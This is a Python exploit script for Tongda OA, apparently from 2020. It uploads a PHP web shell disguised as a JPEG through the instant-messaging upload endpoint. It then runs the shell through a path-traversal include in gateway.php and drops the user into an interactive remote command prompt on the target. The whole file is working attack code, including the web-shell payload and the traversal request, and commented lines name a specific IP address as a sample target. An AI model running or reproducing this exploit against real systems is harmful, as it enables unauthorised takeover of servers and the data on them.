#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
'''
@File    :   tongda_rce.py
@Time    :   2020/03/18 11:59:48
@Author  :   fuhei 
@Version :   1.0
@Blog    :   http://www.lovei.org
'''

import requests
import re
import sys


def check(url):
    
    try:
        url1 = url + '/ispirit/im/upload.php'
        # url = "http://61.142.9.181:8081/ispirit/im/upload.php"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "multipart/form-data; boundary=---------------------------27723940316706158781839860668"}
        data = "-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"f.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['f'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\n\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1222222\r\n-----------------------------27723940316706158781839860668\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n1\r\n-----------------------------27723940316706158781839860668--\r\n"
        result = requests.post(url1, headers=headers, data=data)

        name = "".join(re.findall("2003_(.+?)\|",result.text))
        url2 = url + '/ispirit/interface/gateway.php'
        # url = "http://61.142.9.181:8081/ispirit/interface/gateway.php"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "echo fffhhh"}
        result = requests.post(url2, headers=headers, data=data)
        if result.status_code == 200 and 'fffhhh' in result.text:
            # print("[+] Remote code execution vulnerability exists at the target address")
            return name
        else:   
            return False
    except:
        pass

def command(url, name,command="whoami"):
    url = url + '/ispirit/interface/gateway.php'
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded"}
    data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "%s" % command}
    result = requests.post(url, headers=headers, data=data)
    while(1):
        command = input("fuhei@shell$ ")
        if command == 'exit' or command  == 'quit':
            break
        else:
            data = {"json": "{\"url\":\"../../../general/../attach/im/2003/%s.f.jpg\"}" % (name), "f": "%s" % command}
            result = requests.post(url, headers=headers, data=data)
            print(result.text)

if __name__ == '__main__':
    url = sys.argv[1]
    name = check(url)
    if name:
        print("[+] Remote code execution vulnerability exists at the target address")
        command(url,name)
    else:
        print("[-] There is no remote code execution vulnerability in the target address")


